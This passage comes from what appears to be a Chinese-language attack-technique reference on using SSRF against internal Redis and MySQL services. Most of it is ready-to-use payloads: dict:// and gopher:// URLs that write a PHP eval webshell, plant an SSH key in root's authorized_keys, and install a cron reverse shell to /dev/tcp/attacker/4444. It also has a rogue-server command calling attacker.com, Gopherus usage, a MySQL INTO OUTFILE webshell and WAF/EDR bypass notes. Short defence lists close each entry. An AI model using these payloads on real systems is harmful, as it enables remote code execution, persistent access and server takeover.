```
**语法解析：**
- `dict://127.0.0.1:6379/info
或使用Gopher:
gopher://127.0.0.1:6379/_INFO` — 攻击载荷 _value_

**2. 写入WebShell**
> 写入WebShell到Web目录
```
# 使用Dict协议
dict://127.0.0.1:6379/set%20shell%20"<?php @eval($_POST[cmd]);?>"
dict://127.0.0.1:6379/config%20set%20dir%20/var/www/html
dict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php
dict://127.0.0.1:6379/save
```
**语法解析：**
- `set shell` — 设置键值 _value_
- `config set dir` — 设置保存目录 _value_
- `config set dbfilename` — 设置保存文件名 _value_
- `save` — 保存数据库到文件 _value_

**3. 写入SSH公钥**
> 写入SSH公钥
```
dict://127.0.0.1:6379/set%20ssh%20"ssh-rsa AAAA..."
dict://127.0.0.1:6379/config%20set%20dir%20/root/.ssh
dict://127.0.0.1:6379/config%20set%20dbfilename%20authorized_keys
dict://127.0.0.1:6379/save
```
**语法解析：**
- `dict://127.0.0.1:6379/set%20ssh%20"ssh-rsa` — 命令/载荷起始 _command_
- ` AAAA..."
dict://127.0.0.1:6379/config%20set%20dir%20/root/.ssh
dict://127.0.0.1:6379/config%20set%20dbfilename%20authorized_keys
dict://127.0.0.1:6379/save` — 参数与载荷内容 _value_

**4. 写入Cron任务**
> 写入Cron反弹Shell
_platform: linux_
```
dict://127.0.0.1:6379/set%20cron%20"*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1"
dict://127.0.0.1:6379/config%20set%20dir%20/var/spool/cron
dict://127.0.0.1:6379/config%20set%20dbfilename%20root
dict://127.0.0.1:6379/save
```
**语法解析：**
- `dict://127.0.0.1:6379/set%20cron%20"*/1 * * * * bash -i >& /dev/tcp/attacker/444` — 攻击载荷 _value_

**5. 主从复制RCE**
> 主从复制RCE
```
# 使用redis-rogue-server
python redis-rogue-server.py --rhost=127.0.0.1 --lhost=attacker.com
利用Redis主从复制加载恶意模块
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 使用redis-rogue-server
python redis-rogue-server.py --rhost=127.0.0.1 --lhost=attacker.com
利用Redis主从复制加载恶意模块` — 参数与载荷内容 _value_

**WAF/EDR 绕过变体：**

**Gopher协议构造**
> 使用Gopher协议
```
使用Gopher协议构造完整的Redis命令序列
可以绕过Dict协议限制
```
**语法解析：**
- `使用Gopher协议构造完整的Redis命令序列
可以绕过Dict协议限制` — 攻击载荷 _value_


**概述：** SSRF攻击Redis是最经典的内网服务利用场景，通过gopher://协议向Redis发送命令，可写入WebShell、SSH公钥、Crontab定时任务等，从SSRF直接升级为服务器RCE。

**漏洞原理：** Redis默认无认证且监听0.0.0.0:6379。SSRF通过gopher://发送Redis命令：1)SET/CONFIG SET dir+dbfilename写WebShell到Web目录 2)写SSH公钥到/root/.ssh/authorized_keys 3)写Crontab反弹Shell 4)主从复制加载恶意模块(RCE)。

**利用方法：** 完整利用流程：
1. 通过SSRF探测Redis
2. 写入WebShell
3. 或写入SSH公钥
4. 或写入Cron任务
5. 获取服务器权限

**防御措施：** 防御措施：
1. Redis设置密码认证
2. 绑定内网IP
3. 禁用危险命令
4. 网络隔离

---

### SSRF攻击MySQL  `ssrf-mysql`
_利用SSRF攻击内网MySQL服务_
子类：**MySQL攻击** · tags: `ssrf` `mysql` `gopher` `database`

**前置条件：**
- 存在SSRF漏洞
- 内网存在MySQL服务
- 知道MySQL用户名

**攻击链：**

**1. MySQL协议基础**
> MySQL协议基础
```
MySQL通信协议:
- 握手包
- 认证包
- 命令包
需要构造符合协议的数据
```
**语法解析：**
- `MySQL通信协议` — MySQL使用自定义二进制协议通信，基于TCP _command_
- `握手包` — 服务端发送的初始包，包含协议版本、服务器版本、随机挑战数 _parameter_
- `认证包` — 客户端发送的认证信息，包含用户名和加密密码 _parameter_
- `命令包` — 认证后发送的SQL命令包，类型为COM_QUERY(0x03) _value_

**2. 使用Gopher攻击MySQL**
> Gopher协议攻击MySQL
```
# 构造MySQL协议数据包
# 需要使用工具生成
gopher://127.0.0.1:3306/_[MySQL Protocol Data]

# 使用sqlmap
gopher://127.0.0.1:3306/_[sqlmap生成的payload]
```
**语法解析：**
- `gopher://` — Gopher协议前缀，允许发送原始TCP数据 _command_
- `127.0.0.1:3306` — 目标MySQL服务地址和端口（默认3306） _value_
- `/_` — Gopher数据分隔符，_后为实际发送的数据 _operator_
- `[MySQL Protocol Data]` — URL编码的MySQL协议二进制数据包 _variable_

**3. 使用工具生成Payload**
> 使用工具生成Payload
```
# 使用Gopherus工具
python gopherus.py --exploit mysql
输入用户名和SQL命令
生成Gopher URL

# 或使用mysql_gopher_attack工具
```
**语法解析：**
- `python gopherus.py` — 运行Gopherus自动化Gopher payload生成工具 _command_
- `--exploit mysql` — 指定攻击目标为MySQL服务 _parameter_
- `输入用户名和SQL命令` — 交互式输入MySQL用户名（常为root）和要执行的SQL _value_

**4. 执行SQL命令**
> 执行SQL命令
```
SELECT * FROM users;
SELECT user(), version();
写入WebShell:
SELECT "<?php @eval($_POST[cmd]);?>" INTO OUTFILE "/var/www/html/shell.php";
```
**语法解析：**
- `SELECT user(), version()` — 查询当前数据库用户和MySQL版本信息 _command_
- `INTO OUTFILE` — MySQL写文件语句，需要FILE权限和secure_file_priv允许 _parameter_
- `/var/www/html/shell.php` — WebShell写入路径，需在Web可访问目录下 _value_

**WAF/EDR 绕过变体：**

**无密码MySQL**
> 利用空密码配置
```
如果MySQL允许空密码连接
可以更容易构造攻击载荷
```
**语法解析：**
- `空密码连接` — MySQL允许空密码时，认证包中密码字段为空 _command_
- `简化协议构造` — 无需计算密码哈希，攻击载荷更简单更可靠 _parameter_


**概述：** SSRF攻击MySQL利用gopher://协议构造MySQL通信报文，在目标MySQL允许无密码本地连接时可执行任意SQL语句，读取敏感数据或通过INTO OUTFILE写入WebShell。

**漏洞原理：** MySQL认证允许本地空密码连接时(常见于开发环境)，SSRF通过gopher://发送MySQL协议数据包：1)认证握手报文 2)查询报文(SELECT/INSERT/INTO OUTFILE)。利用工具如Gopherus可自动生成URL编码的MySQL协议payload。

**利用方法：** 完整利用流程：
1. 确认MySQL服务
2. 获取用户名
3. 构造协议数据包
4. 执行SQL命令
5. 写入WebShell

**防御措施：** 防御措施：
1. MySQL设置强密码
2. 禁止空密码登录
3. 限制网络访问
4. 禁用文件写入功能

---
